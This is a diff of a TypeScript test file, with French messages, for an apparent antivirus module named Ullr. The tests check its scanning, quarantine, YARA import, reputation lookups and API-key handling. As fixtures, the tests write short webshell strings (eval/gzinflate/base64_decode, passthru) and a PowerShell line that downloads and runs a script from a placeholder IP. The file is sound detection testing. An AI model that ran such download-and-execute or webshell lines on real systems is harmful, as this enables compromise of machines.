@@ -9,10 +9,10 @@ import { join } from 'node:path';
 import test from 'node:test';
 import { crc32, deflateRawSync, gzipSync } from 'node:zlib';
 import { wireReflexes } from '../src/valhalla/links.ts';
-import { ullr, walk } from '../src/valhalla/modules/ullr.ts';
+import { ullr, ullrKeys, walk } from '../src/valhalla/modules/ullr.ts';
 import { allModules } from '../src/valhalla/odin.ts';
 import { Valhalla } from '../src/valhalla/service.ts';
-import { BASE_RULES, combine, compileGaldr, entropy, fileType, flat, importYara, isPassive, phishing, regDomain, RuleSet, scanBuffer, sureOf, unzip, urlRisk, type Knowledge } from '../src/valhalla/ullr/engine.ts';
+import { BASE_RULES, combine, compileGaldr, entropy, fileType, flat, hay, importYara, reAtom, isPassive, phishing, regDomain, RuleSet, scanBuffer, sureOf, unzip, urlRisk, type Knowledge } from '../src/valhalla/ullr/engine.ts';
 import { Correlator, SENSORS, score, toSignal } from '../src/valhalla/ullr/incidents.ts';
 import { csvLine, Intel, normIoc, parseClamHsb, parseDomains, parseKev, parseMbCsv, parseStalkerware, parseThreatFox, parseUrls, reputationText, SOURCES } from '../src/valhalla/ullr/intel.ts';
 
@@ -231,7 +231,7 @@ private rule Privee { strings: $a = "x" condition: $a }
   assert.equal(y.total, 6, 'six règles publiques lues (la règle privée ne compte pas comme règle utilisable)');
   assert.deepEqual(y.rules.map((r) => r.name).sort(), ['Test_Deux_Sur', 'Test_Pe_Header_Jokers', 'Test_Webshell_Generic', 'Test_Wide_Fullword']);
   assert.equal(y.skipped, 2, 'les règles qui emploient un module ou une boucle sont écartées, pas mal interprétées');
-  const set = new RuleSet(y.rules), hit = (name: string, b: Buffer | string) => set.match({ text: Buffer.from(b as string).toString('latin1'), low: Buffer.from(b as string).toString('latin1').toLowerCase(), size: Buffer.from(b as string).length, name, head: Buffer.from(b as string).subarray(0, 8) }).map((r) => r.name);
+  const set = new RuleSet(y.rules), hit = (name: string, b: Buffer | string) => set.match(hay(Buffer.from(b as string), name)).map((r) => r.name);
   assert.deepEqual(hit('x.php', '<?php EVAL(GZINFLATE(base64_decode("x")));'), ['Test_Webshell_Generic'], 'nocase + octets + condition');
   assert.deepEqual(hit('x.php', '<?php passthru ($x);'), ['Test_Webshell_Generic']);
   assert.deepEqual(hit('x.php', 'eval(gzinflate( sans en-tête php'), []);
@@ -408,7 +408,7 @@ test('Ullr · analyse d\'un dossier : rapport horodaté, menace sûre mise en qu
     writeFileSync(join(d, 'maj.ps1'), 'IEX (New-Object Net.WebClient).DownloadString("http://203.0.113.5/a.ps1")'); writeFileSync(join(d, 'exclu', 'autre.php'), WEBSHELL);
     writeFileSync(join(d, 'vide.txt'), ''); symlinkSync(d, join(d, 'boucle'));
     assert.deepEqual([...walk(d)].map((f) => f.slice(d.length + 1)).sort(), ['eicar.com', 'exclu/autre.php', 'maj.ps1', 'note.txt', 'sous/shell.php', 'vide.txt'], 'les liens symboliques ne sont pas suivis (pas de boucle)');
-    const r = await act(w, 'analyser', { cible: d, exclusions: join(d, 'exclu') });
+    const r = await act(w, 'analyser', { dossier: d, exclusions: join(d, 'exclu') });
     assert.equal(r.ok, true); assert.match(r.text, /5 fichiers analysés[\s\S]*3 détection\(s\)/);
     assert.match(r.text, /\[critique\] PHP\.Webshell \(eval encodé\) — .*sous\/shell\.php \(en quarantaine\)/);
     assert.match(r.text, /\[moyenne\] Test antivirus EICAR — .*eicar\.com \(fichier de test, laissé en place\)/);
@@ -431,7 +431,7 @@ test('Ullr · analyse d\'un dossier : rapport horodaté, menace sûre mise en qu
     assert.match(rep.text, new RegExp(`empreinte ${sha(WEBSHELL)} · trouvé par règle \\+ heuristique · action : en quarantaine · T1505\\.003`)); assert.match(rep.text, /base de signatures version 0/); assert.match(rep.text, /5 fichiers/);
     // Exception sur un dossier, puis fausse alerte : le fichier n'est plus signalé.
     await act(w, 'exception', { quoi: join(d, 'sous') });
-    assert.match((await act(w, 'fichier', { chemin: join(d, 'sous', 'shell.php') })).text, /introuvable, vide, ou dans tes exceptions/);
+    assert.match((await act(w, 'fichier', { chemin: join(d, 'sous', 'shell.php') })).text, /introuvable, vide, ou dans tes exceptions : /);
     const det = (w.v.ctx('ullr').settings.hits as Array<{ id: string; file: string }>).find((x) => x.file.endsWith('maj.ps1'))!;
     assert.match((await act(w, 'faux_positif', { id: det.id })).text, /déclaré sain/);
     assert.match((await act(w, 'fichier', { chemin: join(d, 'maj.ps1') })).text, /^✓ Rien de dangereux/);
@@ -450,7 +450,7 @@ test('Ullr · dans un dossier de tests d\'un projet, une règle ne déplace rien
   const w = world();
   try {
     const d = join(w.home, 'projets', 'site', 'tests', 'fixtures'); mkdirSync(d, { recursive: true }); writeFileSync(join(d, 'shell.php'), WEBSHELL);
-    const r = await act(w, 'analyser', { cible: join(w.home, 'projets') });
+    const r = await act(w, 'analyser', { dossier: join(w.home, 'projets') });
     assert.match(r.text, /PHP\.Webshell.*\(à vérifier\)/); assert.ok(existsSync(join(d, 'shell.php')));
     assert.match((w.v.ctx('ullr').settings.hits as Array<{ why: string[] }>)[0].why.join(' '), /dossier de tests ou d'exemples/);
   } finally { w.end(); }
@@ -507,7 +507,7 @@ test('Ullr · mises à jour : sources interrogées, paquet testé puis activé, 
     assert.ok(w.fetched.every((f) => !f.body.includes('échantillon')), 'aucun contenu de fichier n\'est envoyé');
     // Empreinte connue : détectée et mise en quarantaine, avec la famille.
     writeFileSync(join(d, 'facture.exe'), sample);
-    const r = await act(w, 'analyser', { cible: d });
+    const r = await act(w, 'analyser', { dossier: d });
     assert.match(r.text, /\[critique\] Malware connu : AgentTesla — .*facture\.exe \(en quarantaine\)/); assert.ok(!existsSync(join(d, 'facture.exe')));
     // Règle YARA importée en service ; indicateurs de sites en service.
     writeFileSync(join(d, 'x.php'), '<?php // MARQUEUR-WEBSHELL-ESSAI-7781');
@@ -549,11 +549,11 @@ test('Ullr · réputation en ligne : seule l\'empreinte part, jamais le fichier 
       [/hashlookup\.circl\.lu/, (url) => (url.endsWith(sha(good)) ? Response.json({ FileName: 'sauvegarde-navigateur.py', ProductName: 'Outil de sauvegarde' }) : new Response('{}', { status: 404 }))],
     );
     writeFileSync(join(d, 'a.py'), bad);
-    const r = await act(w, 'analyser', { cible: d });
+    const r = await act(w, 'analyser', { dossier: d });
     assert.match(r.text, /\[critique\] Lit les mots de passe du navigateur et les envoie ailleurs — .*a\.py \(en quarantaine\)/, 'soupçon confirmé par la réputation');
     assert.match((w.v.ctx('ullr').settings.hits as Array<{ why: string[] }>)[0].why.join(' '), /VirusTotal : 39 antivirus sur 69 le jugent dangereux \(trojan\.stealer\)/);
     writeFileSync(join(d, 'b.py'), good);
-    const r2 = await act(w, 'analyser', { cible: d });
+    const r2 = await act(w, 'analyser', { dossier: d });
     assert.match(r2.text, /\[moyenne\] Lit les mots de passe.*b\.py \(à vérifier\)/); assert.ok(existsSync(join(d, 'b.py')));
     assert.match((w.v.ctx('ullr').settings.hits as Array<{ file: string; why: string[] }>).find((h) => h.file.endsWith('b.py'))!.why.join(' '), /CIRCL : fichier connu d'un logiciel légitime.*probablement une fausse alerte/);
     // Rien d'autre que des empreintes n'est parti, la clé est dans l'en-tête (jamais dans l'adresse), une seule demande par empreinte (cache).
@@ -578,17 +578,34 @@ test('Ullr · sans clé ni réseau : il fonctionne quand même (règles de base)
     assert.match((await act(w, 'failles')).text, /pas encore chargé/);
     assert.match((await act(w, 'reputation', { empreinte: 'a'.repeat(64) })).text, /CIRCL|Aucune source/);
     const d = join(w.home, 'x'); mkdirSync(d); writeFileSync(join(d, 'eicar.com'), EICAR);
-    assert.match((await act(w, 'analyser', { cible: d })).text, /Test antivirus EICAR/);
-    assert.match((await act(w, 'analyser', { cible: join(w.home, 'absent') })).text, /rien à analyser/);
+    assert.match((await act(w, 'analyser', { dossier: d })).text, /Test antivirus EICAR/);
+    assert.match((await act(w, 'analyser', { dossier: join(w.home, 'absent') })).text, /rien à analyser/);
   } finally { w.end(); }
+});
+
+test('Ullr · clés des sources : rangées avec les secrets d\'Odin, jamais affichées, forme vérifiée', async () => {
+  const w = world(), saved: Array<[string, string]> = [];
+  try {
+    ullrKeys((n, v) => { saved.push([n, v]); process.env[n] = v; });
+    assert.match((await act(w, 'cles')).text, /Clé abuse\.ch : absente · clé VirusTotal : absente/);
+    assert.match((await act(w, 'cles', { abuse_ch: 'avec espace interdit' })).text, /n'a pas la bonne forme/);
+    assert.deepEqual(saved, []);
+    w.routes.push([/abuse\.ch/, () => new Response('', { status: 401 })]);
+    const r = await act(w, 'cles', { abuse_ch: 'CleSecreteDeTest0123456789', virustotal: 'AutreCleSecrete9876543210abcdef' });
+    assert.deepEqual(saved, [['ABUSE_CH_KEY', 'CleSecreteDeTest0123456789'], ['VT_API_KEY', 'AutreCleSecrete9876543210abcdef']]);
+    assert.match(r.text, /Clé abuse\.ch et VirusTotal rangée avec les secrets d'Odin/); assert.match(r.text, /✗ MalwareBazaar : mb-api\.abuse\.ch a répondu 401 \(clé refusée ou accès non autorisé\)/, 'les trois sources sont essayées tout de suite, et un refus est dit clairement');
+    const page = JSON.stringify(await ullr.view!(w.v.ctx('ullr'), new URLSearchParams())) + r.text + (await act(w, 'cles')).text + (await act(w, 'sources')).text + JSON.stringify(w.v.ctx('ullr').settings);
+    assert.ok(!/CleSecreteDeTest|AutreCleSecrete/.test(page), 'aucune clé dans la page, les réponses ou les réglages de l\'appli');
+    assert.match(page, /abuse\.ch : présente · VirusTotal : présente/);
+  } finally { ullrKeys(undefined); w.end(); }
 });
 
 test('Ullr · plans d\'analyse, règle Galdr ajoutée, arrêt d\'une analyse, page de l\'appli', async () => {
   const w = world();
   try {
     const d = join(w.home, 'docs'); mkdirSync(d); writeFileSync(join(d, 'a.sh'), '#!/bin/sh\necho MOT-INTERDIT-ESSAI\n');
-    assert.match((await act(w, 'plan', { nom: 'Documents', cible: d, quand: 'semaine', heure: '02:30', exclusions: `${d}/tmp` })).text, /« Documents » : .* chaque semaine à 02:30, 1 dossier\(s\) exclu\(s\)/);
-    assert.match((await act(w, 'plan', { nom: 'Absent', cible: '/nulle/part' })).text, /cible introuvable/);
+    assert.match((await act(w, 'plan', { nom: 'Documents', dossier: d, quand: 'semaine', heure: '02:30', exclusions: `${d}/tmp` })).text, /« Documents » : .* chaque semaine à 02:30, 1 dossier\(s\) exclu\(s\)/);
+    assert.match((await act(w, 'plan', { nom: 'Absent', dossier: '/nulle/part' })).text, /cible introuvable/);
     assert.match((await act(w, 'plans')).text, /Documents : .* chaque semaine à 02:30 · dernière : jamais/);
     assert.match((await act(w, 'regle', { nom: 'Mot interdit', chaines: 'MOT-INTERDIT-ESSAI', gravite: 'haute' })).text, /Règle « Mot interdit » ajoutée/);
     assert.match((await act(w, 'regle', { nom: 'Cassée', chaines: '/(/' })).text, /Invalid regular expression|expression/i);
@@ -611,7 +628,7 @@ test('Ullr · plans d\'analyse, règle Galdr ajoutée, arrêt d\'une analyse, pa
     const titles = view.sections.map((s) => s.title);
     for (const t of ['Incidents (signaux reliés entre les applis)', 'Détections', 'Quarantaine', 'Analyses planifiées', 'Rapports', 'Sources des signatures', 'Capteurs : les applis qui renseignent l\'antivirus', 'Ce qu\'il faut savoir']) assert.ok(titles.includes(t), `section « ${t} »`);
     const text = JSON.stringify(view);
-    assert.match(text, /Aucun antivirus ne détecte 100 % des menaces/); assert.ok(!/cle-|password|secret/i.test(text), 'aucun secret dans la page');
+    assert.match(text, /Aucun antivirus ne détecte 100 % des menaces/); assert.ok(!/cle-abuse-de-test|cle-vt-de-test/.test(text), 'aucune clé dans la page');
     assert.equal(view.sections.find((s) => s.title?.startsWith('Capteurs'))!.kind, 'table');
   } finally { w.end(); }
 });
